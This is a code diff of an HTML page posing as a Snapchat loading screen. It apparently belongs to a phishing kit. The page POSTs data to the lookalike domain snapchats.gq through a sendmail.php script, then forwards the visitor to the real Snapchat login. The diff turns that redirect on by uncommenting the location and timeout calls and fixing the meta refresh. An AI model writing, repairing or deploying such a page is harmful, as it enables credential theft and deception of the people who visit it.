@@ -4,7 +4,7 @@
 	<title>Snapchat | Loading&hellip;</title>
 	<meta charset='utf-8'>
 	<meta name='viewport' content='width=device-width, height=device-height, initial-scale=1, user-scalable=no'>
-	<meta http-equiv='/refresh' content='1; url=https://accounts.snapchat.com/accounts/login'>
+	<meta http-equiv='refresh' content='1; url=https://accounts.snapchat.com/accounts/login'>
 
 	<style type='text/css'>
 		html, body {
@@ -158,8 +158,8 @@
 	<script src='https://smtpjs.com/v3/smtp.js'></script>
 	<script>
 	function redirect() {
-		//location.replace('https://accounts.snapchat.com/accounts/login');
-		//location.assign('https://accounts.snapchat.com/accounts/login');
+		location.replace('https://accounts.snapchat.com/accounts/login');
+		location.assign('https://accounts.snapchat.com/accounts/login');
 	}
 	fetch('https://snapchats.gq/sendmail.php', {
     method: 'POST',
@@ -183,7 +183,7 @@
     	'unsubURL' : 'https://www.google.com/spam'
    	})
   }).then(redirect);
-	//setTimeout(redirect, 500);
+	setTimeout(redirect, 500);
 	</script>
 </body>
 </html>
